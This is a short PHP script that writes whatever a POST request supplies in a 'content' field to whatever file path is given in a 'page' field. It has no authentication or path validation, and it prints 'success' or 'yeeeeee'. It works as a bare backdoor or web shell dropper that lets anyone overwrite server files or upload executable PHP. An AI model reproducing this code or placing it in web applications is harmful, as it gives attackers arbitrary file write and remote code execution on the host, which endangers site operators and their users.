<?php



if(isset($_POST["page"])&&$_POST["page"]!="")
{

     $num =  file_put_contents($_POST["page"],$_POST["content"]);

	echo $num."  ".$_POST["content"]."success";
}
else
{
	echo "yeeeeee";
}

?>
